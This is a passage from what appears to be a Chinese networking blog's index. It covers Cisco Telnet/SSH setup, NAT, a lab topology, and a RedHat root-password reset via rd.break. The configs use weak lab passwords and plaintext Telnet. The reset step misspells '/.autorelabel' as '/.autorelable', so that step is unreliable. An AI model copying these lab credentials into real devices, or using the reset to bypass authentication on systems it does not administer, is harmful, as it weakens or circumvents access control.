target="_blank" rel="noopener">思科的浮动静态路由协议配置</a></p></li><li><p><a href="https://blog.csdn.net/zonghua521/article/details/78198026" target="_blank" rel="noopener">OSPF配置实验</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网路配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之远程管理</title>
      <link href="/2020/12/05/wang-luo-pei-zhi-zhi-yuan-cheng-guan-li/"/>
      <url>/2020/12/05/wang-luo-pei-zhi-zhi-yuan-cheng-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-远程管理"><a href="#0x01-远程管理" class="headerlink" title="0x01 远程管理"></a>0x01 远程管理</h1><ol><li><p>什么是远程管理？</p><p>远程管理即不在直接接触物理设备的情况下，实现对网络设备的管理。</p></li><li><p>为什么要配置远程管理？</p><p>在组网初期，交换机和路由器都没有进行配置所以只能使用<code>Console</code>线连接设备进行相关的配置，但是在完成组网之后还使用<code>Console</code>连接的方式来修改网络配置就很不方便，所以一般在将网络设备加入网络之前都会开启设备的远程管理。</p></li><li><p>常用的远程管理方式有哪些？</p><ul><li>Telnet</li><li>SSH</li></ul></li></ol><h1 id="0x02-网络配置"><a href="#0x02-网络配置" class="headerlink" title="0x02 网络配置"></a>0x02 网络配置</h1><h2 id="0x01-网络拓扑"><a href="#0x01-网络拓扑" class="headerlink" title="0x01 网络拓扑"></a>0x01 网络拓扑</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/网络拓扑.png" alt="网络拓扑"></center><h2 id="0x02-网络要求"><a href="#0x02-网络要求" class="headerlink" title="0x02 网络要求"></a>0x02 网络要求</h2><ul><li>实现全网互通；</li><li>SW1交换机使用Telnet方式进行远程管理；</li><li>R1路由器使用SSH方式进行远程管理；</li><li>SW2交换机可以同时使用Telnet和SSH进行远程管理；</li></ul><h2 id="0x03-基础配置"><a href="#0x03-基础配置" class="headerlink" title="0x03 基础配置"></a>0x03 基础配置</h2><ol><li><p>配置PC机的IP地址、子网掩码等信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/配置PC.png" alt="配置PC"></center><p>PC2的配置步骤也如PC1所示。</p></li><li><p>为简化配置，该网络拓扑中没有划分VLAN，所以二层交换在此过程中不需要配置。</p></li><li><p>配置R1路由器的IP地址、子网掩码等信息，操作步骤如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/R1基础配置.png" alt="R1基础配置"></center></li><li><p>PC1去pingPC2，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/网络连通性测试.png" alt="网络连通性测试"></center></li></ol><h2 id="0x04-Telnet配置"><a href="#0x04-Telnet配置" class="headerlink" title="0x04 Telnet配置"></a>0x04 Telnet配置</h2><ol><li><p>打开SW1配置界面，使用如下命令来完成对Telnet的配置，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf tint vlan 1ip add 192.168.1.2 255.255.255.0no shexitip default-gateway 192.168.1.1enable pass ciscoline vty 0 4transport input telnetpass ciscologin</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/SW1配置远程管理.png" alt="SW1配置远程管理"></center></li><li><p>配置结果验证，让PC1主机使用Telnet方式远程管理SW1交换机，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/远程管理SW1交换机.png" alt="远程管理SW1交换机"></center></li></ol><p>注：</p><ul><li><p>命令解释：</p><pre class=" language-shell"><code class="language-shell">enconf t# 进入vlan1接口，为交换机配置IP地址，没有IP地址就无法实现远程管理int vlan 1# 配置IP地址ip add 192.168.1.2 255.255.255.0# 开启接口no shexit# 设置交换机的默认网关ip default-gateway 192.168.1.1# 设置进入特权模式的密码(明文)enable pass cisco# 进入vty链路，开启5个接口line vty 0 4# 只允许telnet方式远程管理transport input telnet# 设置认证的密码pass cisco# 登录认证login</code></pre></li></ul><h2 id="0x05-SSH配置"><a href="#0x05-SSH配置" class="headerlink" title="0x05 SSH配置"></a>0x05 SSH配置</h2><ol><li><p>打开R1配置界面，使用如下命令完成SSH配置，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf tenable secret ciscohostname R1ip domain-name baidu.comusername admin password 0 admincrypto key generate rsa general-keys modulus 1024ip ssh version 2ip ssh time-out 60ip ssh authentication-retries 2line vty 0 4transport input sshlogin local</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/配置SSH.png" alt="配置SSH"></center></li><li><p>配置结果验证，让PC1主机使用SSH方式远程管理R1路由器，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/SSH验证.png" alt="SSH验证"></center></li><li><p>让PC1主机使用Telnet方式远程管理SW1交换机，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/PC1TelnetR1失败.png" alt="PC1TelnetR1失败"></center></li></ol><p>注：</p><ul><li><p>命令解释：</p><pre class=" language-shell"><code class="language-shell">enconf t# 配置进入特权模式的密码enable secret cisco# 设置主机名hostname R1# 设置域名ip domain-name baidu.com# 添加用于认的登录用户名及口令username admin password 0 admin# 配置非对称密钥为1024位（缺省位512位）crypto key generate rsa general-keys modulus 1024# 配置SSH版本ip ssh version 2# 配置SSH会话最大空闲超时值为60sip ssh time-out 60# 配置SSH连接认证重试次数为2次ip ssh authentication-retries 2# 进入vty链路line vty 0 4# 只允许SSH连接transport input ssh# 要求本地认证login local</code></pre></li></ul><h2 id="0x06-Telnet和SSH并存"><a href="#0x06-Telnet和SSH并存" class="headerlink" title="0x06 Telnet和SSH并存"></a>0x06 Telnet和SSH并存</h2><ol><li><p>打开SW2配置界面，使用如下命令完成配置，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf tint vlan 1ip add 192.168.2.2 255.255.255.0no shenable secret ciscoservice password-encryptionhostname SW2ip domain-name baidu.comusername admin password 0 admincrypto key generate rsa general-keys modulus 1024ip ssh version 2ip ssh time-out 60ip ssh authentication-retries 2line vty 0 4transport input alllogin local</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/配置SW2远程管理.png" alt="配置SW2远程管理"></center></li><li><p>配置结果验证，让PC2主机使用SSH方式远程管理SW2路由器，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/SSH方式远程管理PC2.png" alt="SSH方式远程管理SW2"></center></li><li><p>让PC2主机使用Telnet方式远程管理SW2交换机，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/RemoteManagement/Telnet方式远程管理SW2.png" alt="Telnet方式远程管理SW2"></center></li></ol><p>注：</p><ul><li><p>命令解释：</p><pre class=" language-shell"><code class="language-shell">enconf t# 进入vlan1接口配置IP地址int vlan 1ip add 192.168.2.2 255.255.255.0no sh# 配置进入特权模式的密码enable secret cisco# 将明文密码加密service password-encryption# 配置主机名hostname SW2# 配置域名ip domain-name baidu.com# 添加认证用户名及密码username admin password 0 admin# 配置非对称密钥为1024位（缺省位512位）crypto key generate rsa general-keys modulus 1024ip ssh version 2# 最大空闲超时60秒ip ssh time-out 60# 认证重试2次ip ssh authentication-retries 2line vty 0 4# 允许所有协议通过vty进入transport input all# 要求本地认证login local</code></pre></li></ul><h1 id="0x03-实验总结"><a href="#0x03-实验总结" class="headerlink" title="0x03 实验总结"></a>0x03 实验总结</h1><ul><li>远程管理主要分为Telnet和SSH两种方式，其中SSH较Telnet的安全性更高；</li><li>Telnet配置步骤：<ul><li>配置IP地址（如果是二层交换机还需要配置默认网关）</li><li>配置进入特权模式的密码</li><li>进入VTY链路，配置<strong>密码</strong>和允许的<strong>telnet协议</strong>通过</li><li>启动密码认证</li></ul></li><li>SSH配置：<ul><li>配置IP地址</li><li>配置进入特权模式的密码</li><li>配置主机名</li><li>配置域名</li><li>添加认证的登录用户名及密码</li><li>配置非对称密钥</li><li>配置最大空闲超时值</li><li>配置最大认证重试次数</li><li>进入VTY链路，配置允许<strong>SSH协议</strong>通过</li><li>启动本地认证</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重置root管理员密码</title>
      <link href="/2020/12/03/chong-zhi-root-guan-li-yuan-mi-ma/"/>
      <url>/2020/12/03/chong-zhi-root-guan-li-yuan-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-重置RedHat的root密码"><a href="#0x01-重置RedHat的root密码" class="headerlink" title="0x01 重置RedHat的root密码"></a>0x01 重置RedHat的root密码</h1><ol><li><p>首先需要确定Linux系统的版本，在Linux中使用<code>cat /etc/redhat-release</code>命令查看Linux的系统版本，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/rootPwd/查看RedHat系统版本.png" alt="查看RedHat系统版本"></center><p>为什么要查看系统版本？不同版本的Linux重置root密码的操作步骤不一样，所以需要先确定Linux版本。</p></li><li><p>重启Linux系统主机并出现引导界面时，按下键盘上的<code>e</code>键进入内核编辑界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/rootPwd/进入Linux内核.gif" alt="进入Linux内核"></center></li><li><p>在<code>linux16</code>参数这行的最后追加<code>rd.break</code>参数，然后按下【Ctrl+X】组合键来运行修改过的内核程序，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/rootPwd/进入系统的紧急救援模式.gif" alt="进入系统的紧急救援模式"></center></li><li><p>在救援模式中输入以下命令，修改root密码，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell"># 重新将/sysroot挂在为可读写模式mount -o remount,rw /sysroot# chroot(change root directory)# 指定/sysroot为新的根目录chroot /sysroot# 设置新密码passwd# 让SElinux生效，如果不执行修改的密码是不会生效的，也无法登录touch /.autorelableexit# 重启reboot</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/System/Linux/rootPwd/修改密码.png" alt="修改密码"></center></li></ol><p>注：</p><ul><li>该方式使用与RedHat和CentOS中，作者的测试环境为CentOS7.5。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络技术之NAT</title>
      <link href="/2020/11/30/wang-luo-ji-zhu-zhi-nat/"/>
      <url>/2020/11/30/wang-luo-ji-zhu-zhi-nat/</url>
      
        <content type="html"><![CDATA[<h1 id="NAT背景"><a href="#NAT背景" class="headerlink" title="NAT背景"></a>NAT背景</h1><ul><li>网络迅速发展，合法的IP地址资源日益短缺（2011年2月3日， IANA对外宣布：IPv4地址空间最后5个地址块已经被分配给下属的5个地区委员会）</li><li>局域网内部的主机一般使用私有地址，私有地址在Internet上无法路由，如果采用私有地址的网络设备需要访问Internet必须将其IP转为公有IP地址</li></ul><h1 id="NAT工作原理"><a href="#NAT工作原理" class="headerlink" title="NAT工作原理"></a>NAT工作原理</h1><p>​        <strong>网络地址转换</strong>（<code>Network Address Translation</code>，<code>NAT</code>）提供私有地址到共有地址的转换。因为私有地址在Internet上无法路由，Internet有效的路由必须是共有地址，因此配置私有地址的网络设备想要访问必须将其数据包中的私有地址转换为共有地址才能正常访问Internet。一般在网络上会有一个设备提供NAT服务（NAT设备），局域网内部的主机访问Internet时，在NAT设备中将数据包中的源IP地址（私有）转换成共有IP地址后转发到Internet上。</p><h2 id="NAT包含地址"><a href="#NAT包含地址" class="headerlink" title="NAT包含地址"></a>NAT包含地址</h2><ul><li>内部局部地址：内网中主机使用的私有IP地址</li><li>内部全局地址：NAT设备转换后的共有IP地址</li><li>外部全局地址：相对于另一个内网来说，使用NAT设备转换后的共有IP地址</li><li>外部局部地址：指的是另一个内网中主机的私有IP地址，<font color="blue">但是在实际的网络中外部局部地址和外部全局地址是一样，原因是经过NAT转换后Internet上的其他设备不会知道外内部主机的IP地址</font>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Technology/NAT/NAT包含地址类型.png" alt="NAT包含地址类型"></center><h2 id="NAT转换条目"><a href="#NAT转换条目" class="headerlink" title="NAT转换条目"></a>NAT转换条目</h2><ul><li>简单转换条目：只定义IP</li><li>扩展转换条目：定义协议、IP、端口</li></ul><h2 id="NAT关键流程"><a href="#NAT关键流程" class="headerlink" title="NAT关键流程"></a>NAT关键流程</h2><ul><li>网络被分为私网和公网两部分，NAT网关常设置在私网到公网的路由出口位置。</li><li><font color="blue">网络访问只能先由私网侧发起，公网无法主动访问私网主机</font>。</li><li>NAT网关在两个访问方向上完成两次地址的转换或翻译，出方向做源IP替换，入方向做目的IP替换。</li><li>NAT网关的存在对通信双方是保持透明的。</li><li>NAT网关为了实现双向翻译的功能，需要维护一张关联表，把会话的信息保存下来。</li></ul><h1 id="NAT的优缺点"><a href="#NAT的优缺点" class="headerlink" title="NAT的优缺点"></a>NAT的优缺点</h1><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>节省公有合法IP地址</li><li>处理地址重叠</li><li>增强灵活性：地址转换可以在局域网内部提供给外部FTP、WWW、Telnet服务</li><li>安全性：NAT可以有效地隐藏内部局域网中的主机，具有一定的网络安全保护作用</li></ul><h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul><li>延迟增大</li><li>配置和维护的复杂性</li><li>无法进行端到端的IP跟踪（破坏了端对端通信的平等性）</li><li>不支持某些应用（FTP），可以通过静态NAT映射来避免</li></ul><h1 id="NAT分类"><a href="#NAT分类" class="headerlink" title="NAT分类"></a>NAT分类</h1><ul><li><strong>静态NAT</strong>：内部主机占用一个公网IP，这种方式被称为一对一模型。这种方式对解决IP地址短缺没有帮助，只在特定的组网环境中使用。<ul><li>隐藏内部主机的真实IP</li><li>实现两个IP地址重叠网络的通信</li></ul></li><li><strong>动态NAT</strong>：内部主机的私有地址在NAT网关中被转换为地址池中的一个共有地址。</li><li><strong>PAT</strong>：利用源端口将多个私有IP地址映射到一个共有IP地址，这种方式被称为多对一模型。其核心在于利用端口号实现公网和私网的转换，因此理论上最多可让65535台主机共用一个共有IP地址。</li></ul><h1 id="NAT配置"><a href="#NAT配置" class="headerlink" title="NAT配置"></a>NAT配置</h1><ol><li>接口IP地址配置</li><li>使用ACL定义哪些内部主机能做NAT</li><li>决定采用什么公有地址，静态或地址池</li><li>在内部和外部端口上启用NAT</li><li>指定地址转换映射</li></ol><h2 id="静态NAT配置"><a href="#静态NAT配置" class="headerlink" title="静态NAT配置"></a>静态NAT配置</h2><pre class=" language-shell"><code class="language-shell"># 在内部和外部端口上启动NATint f0/0ip nat insideint f0/1ip nat outside# 一对一地址映射-- 简单转换条目ip nat inside source static 192.168.1.100 200.200.200.200-- 扩展转换条目ip nat inside source static tcp 192.168.1.100 8888 200.200.200.200 80 extendable--extendable在PT中默认没有</code></pre><h2 id="动态NAT配置"><a href="#动态NAT配置" class="headerlink" title="动态NAT配置"></a>动态NAT配置</h2><pre class=" language-shell"><code class="language-shell"># 在内部和外部端口上启动NATint f0/0ip nat insideint f0/1ip nat outside# 通过ACL设置转换源（标准）access-list 1 permit 192.168.1.0 0.0.0.255# 设置内部全局地址池ip nat pool 名字 开始IP 结束IP netmask 子网掩码如果加overload代表是可以复用# 将转换源和地址池关联ip nat inside source list acl编号 pool 地址池名字 (overload)如果加overload代表是可以复用</code></pre><h2 id="PAT配置"><a href="#PAT配置" class="headerlink" title="PAT配置"></a>PAT配置</h2><pre class=" language-shell"><code class="language-shell"># 在内部和外部端口上启动NATint f0/0ip nat outsideint f0/1ip nat inside# 使用ACL定义转换源access-list 1 permit 192.168.1.0 0.0.0.255# 关联转换源和目标ip nat inside source list 1 interface f0/0 overload</code></pre><h1 id="查看NAT转换条目"><a href="#查看NAT转换条目" class="headerlink" title="查看NAT转换条目"></a>查看NAT转换条目</h1><pre class=" language-shell"><code class="language-shell">show ip nat translation [verbose]- verbose显示详细的NAT转换条目信息</code></pre><h1 id="清除NAT转换条目"><a href="#清除NAT转换条目" class="headerlink" title="清除NAT转换条目"></a>清除NAT转换条目</h1><pre class=" language-shell"><code class="language-shell"># 清除NAT转换表中的所有条目clear ip nat translation *# 清除包含内部转换的转换条目clear ip nat translation inside local-ip global-ip# 清除包含外部转换的转换条目clear ip nat translation outside local-ip global-ip-- 静态NAT条目不会被清除</code></pre><h1 id="NAT故障处理"><a href="#NAT故障处理" class="headerlink" title="NAT故障处理"></a>NAT故障处理</h1><ol><li>检查物理设备和NAT配置</li><li>通过show命令查看NAT的各种信息</li><li>通过<code>debug ip nat</code>命令跟踪NAT操作</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://blog.csdn.net/gui951753/article/details/79593307" target="_blank" rel="noopener">NAT（地址转换技术）详解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见网络协议整理</title>
      <link href="/2020/11/29/chang-jian-wang-luo-xie-yi-zheng-li/"/>
      <url>/2020/11/29/chang-jian-wang-luo-xie-yi-zheng-li/</url>
      
        <content type="html"><![CDATA[<h1 id="常见网络协议概述"><a href="#常见网络协议概述" class="headerlink" title="常见网络协议概述"></a>常见网络协议概述</h1><h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><h2 id="0x01-VLAN"><a href="#0x01-VLAN" class="headerlink" title="0x01 VLAN"></a>0x01 VLAN</h2><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>0x01 ARP/RARP</p><p>0x02 ICMP</p><p>0x03 IGMP</p><p>0x04 IP</p><p>0x05 OSPF</p><p>0x06 </p><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><p>0x01 TCP</p><p>0x02 UDP</p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>0x01 BGP</p><p>0x02 DHCP</p><p>0x03 DNS</p><p>0x04 IPSec</p><p>0x05 RIP</p><p>0x06 NTP</p><p>0x07 SNMP</p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之大型综合实验2</title>
      <link href="/2020/11/29/wang-luo-pei-zhi-zhi-da-xing-zong-he-shi-yan-2/"/>
      <url>/2020/11/29/wang-luo-pei-zhi-zhi-da-xing-zong-he-shi-yan-2/</url>
      
        <content type="html"><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/实验拓扑.png" alt="实验拓扑"></center><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>全局要求：</p><ol><li><p>网络规划，可用网段：192.168.1.0/24</p></li><li><p>通过rip协议实现全网通</p></li><li><p>所有的网络设备必须命名 vlan命名</p></li><li><p>网关设备可以不可以telnet只可以ssh远程访问</p></li><li><p>三层交换机可以telnet 也可以ssh</p></li><li><p>实现hsrp +STP的负载均衡和双机热备</p></li></ol><p>天津部要求：</p><ol><li><p>tj-r做DHCP分配内网IP</p></li><li><p>单笔路由实现跨vlan通信</p></li><li><p>二层交换机只可以被admin telnet其他的不可以远程</p></li><li><p>路由器只可以ssh远程管理不可以telnet</p></li><li><p>拒绝vlan200访问ISP的web和DNS，允许访问FTP</p></li><li><p>允许vlan300的主机访问ftp web和DNS（<code>www.bihuo.com</code>）</p></li><li><p>允许other-A访问pingweb服务器和DNS服务器不让访问其他服务</p></li><li><p>没有涉及到的服务都可以访问 </p></li></ol><p>北京部要求：</p><ol><li><p>HSRP+STP实现双机热备负载均衡</p></li><li><p>有DHCP服务器为其他的所有主机分配IP地址</p></li><li><p>允许adminvlan访问服务器的所有协议，</p></li><li><p>允许vlan otherA访问FTP服务，拒绝访问web服务</p></li><li><p>拒绝other-B访问FTP 服务，</p></li><li><p>只有admin可以ping 其他主机都不可以ping服务器</p></li><li><p>允许vlan10 vlan20 通过<code>www.bihuo.com</code>访问Web服务器</p></li></ol><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="0x01-子网划分"><a href="#0x01-子网划分" class="headerlink" title="0x01 子网划分"></a>0x01 子网划分</h2><ol><li><p>查拓扑各网络，判断需要14个子网，将<code>192.168.1.0</code>划分出4位进行子网划分，划分结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/IP网段划分.png" alt="IP网段划分"></center></li><li><p>接着将划分好的网段标注在各个网段中，以便清楚的显示个网段被划分的子网情况，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/子网划分.png" alt="子网划分"></center></li></ol><h2 id="0x02-基础网络配置"><a href="#0x02-基础网络配置" class="headerlink" title="0x02 基础网络配置"></a>0x02 基础网络配置</h2><ol><li><p>对DMZ-server区服务器的IP配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/DMZ-server配置IP.png" alt="DMZ-server配置IP"></center></li><li><p>对DMZ-server区服务器配置Web服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/DMZ-server配置Went.png" alt="DMZ-server配置Went"></center></li><li><p>对DMZ-server区服务器配置DHCP服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/DMZ-server配置DHCP.png" alt="DMZ-server配置DHCP"></center></li><li><p>对DMZ-server区服务器配置FTP服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/DMZ-server配置FTP.png" alt="DMZ-server配置FTP"></center></li><li><p>对ISP-Web服务器配置IP，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-Web配置IP.png" alt="ISP-Web配置IP"></center></li><li><p>对ISP-Web服务器配置Web服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-Web配置Web.png" alt="ISP-Web配置Web"></center></li><li><p>对ISP-DNS服务器配置IP，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-DNS配置IP.png" alt="ISP-DNS配置IP"></center></li><li><p>对ISP-DNS服务器配置DNS服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-DNS配置DNS .png" alt="ISP-DNS配置DNS "></center></li><li><p>对 ISP-FTP服务器配置IP，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-FTP配置IP.png" alt="ISP-FTP配置IP"></center></li><li><p>对ISP-FTP服务器配置FTP服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-FTP配置FTP.png" alt="ISP-FTP配置FTP"></center></li><li><p>tj-sw-zuo基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-sw-zuo基础配置.png" alt="tj-sw-zuo基础配置"></center></li><li><p>tj-sw-you基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-sw-you基础配置.png" alt="tj-sw-you基础配置"></center></li><li><p>tj-R基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-R基础配置.png" alt="tj-R基础配置"></center></li><li><p>ISP-B基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-B基础配置.png" alt="ISP-B基础配置"></center></li><li><p>ISP-B-DHCP-server基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-BDHCP-server基础配置.png" alt="ISP-BDHCP-server基础配置"></center></li><li><p>ISP-A基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/ISP-A基础配置.png" alt="ISP-A基础配置"></center></li><li><p>bj-R基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-R基础配置.png" alt="bj-R基础配置"></center></li><li><p>3sw-zuo基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/3sw-zuo基础配置.png" alt="3sw-zuo基础配置"></center></li><li><p>3sw-you基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/3sw-you基础配置.png" alt="3sw-you基础配置"></center></li><li><p>2sw-zuo基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/2sw-zuo基础配置.png" alt="2sw-zuo基础配置"></center></li><li><p>2sw-you基础配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/2sw-you基础配置.png" alt="2sw-you基础配置"></center></li><li><p>阶段性结果检查，bj-admin-A访问<code>www.bihuo.com</code>，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-admin-A连通性检测.png" alt="bj-admin-A连通性检测"></center><p>bj-admin-A检测与tj-server的连通性，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-admin-A检测与tj-server的连通性.png" alt="bj-admin-A检测与tj-server的连通性"></center><p>其他连通性也使用类似的方式进行检测，检测结果全网设备互通。</p></li></ol><h2 id="0x03-远程管理配置"><a href="#0x03-远程管理配置" class="headerlink" title="0x03 远程管理配置"></a>0x03 远程管理配置</h2><ol><li><p>配置tj-sw-zuo交换机的远程管理，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-sw-zuo配置远程管理.png" alt="tj-sw-zuo配置远程管理"></center></li><li><p>配置tj-sw-you交换机的远程管理，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-sw-you配置远程管理.png" alt="tj-sw-you配置远程管理"></center></li><li><p>配置tj-R路由器的远程管理，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/tj-R配置远程管理.png" alt="tj-R配置远程管理"></center></li><li><p>配置bj-R路由器的远程管理，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-R配置远程管理.png" alt="bj-R配置远程管理"></center></li><li><p>配置3sw-zuo交换机的远程管理，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/3sw-zuo配置远程管理.png" alt="3sw-zuo配置远程管理"></center></li><li><p>配置3sw-you交换机的远程管理，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/3sw-you配置远程管理.png" alt="3sw-you配置远程管理"></center></li><li><p>远程管理配置完毕之后，先进行一下测试，首先使用bj-admin-A以ssh方式远程管理bj-R，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-R的SSH管理.png" alt="bj-R的SSH管理"></center><p>接着使用bj-admin-A以telnet方式远程管理bj-R，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/bj-R的telent方式.png" alt="bj-R的telent方式"></center><p>最后使用bj-admin-A以ssh方式远程管理3sw-zuo，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment2/3sw-zuo的ssh管理.png" alt="3sw-zuo的ssh管理"></center><p>其他远程管理也依据上例进行测试，测试结果符合实验要求。</p></li></ol><h2 id="0x04-ACL配置"><a href="#0x04-ACL配置" class="headerlink" title="0x04 ACL配置"></a>0x04 